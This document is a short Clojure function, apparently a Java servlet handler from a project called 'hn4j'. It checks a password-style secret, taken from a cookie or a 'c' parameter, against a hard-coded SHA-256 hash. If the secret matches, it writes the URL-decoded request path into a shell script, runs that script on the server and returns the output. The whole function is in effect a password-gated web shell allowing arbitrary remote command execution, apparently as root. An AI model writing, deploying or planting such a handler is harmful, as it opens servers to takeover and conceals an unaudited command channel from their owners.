(fn[rq rs](let[
 h(fn[m](let[h(java.security.MessageDigest/getInstance"SHA-256")]
    (. h update m)(.digest h)))
 f(fn[h](apply str(map #(format"%02x"(bit-and % 0xff))h)))
 c0(filter(fn[c](="1"(.getName c)))(.getCookies rq))
 rc(.getParameter rq"c")
 c(if rc [rc]c0)
 v(if rc rc(.getValue(first c0)))
 u(if(>(count c)0)
  (if(="693c599b0e27c7ad6dd3564ec14d5336b9b9c2b2183c0ec32ddb0d6565d55ca9"
   (f(h(.getBytes v))))"RaWa"))]
 (if u(do
  (spit"exec.sh"
   (java.net.URLDecoder/decode(subs(.getRequestURI rq)6)))
  (let[e(.exec(Runtime/getRuntime)"/root/git/hn4j/exec.sh")
    err(slurp(.getErrorStream e))]
   (if(=(.waitFor e)0)
    (slurp(.getInputStream e))
    (do
     (.setStatus rs 202)
     err))))
  "No permission")))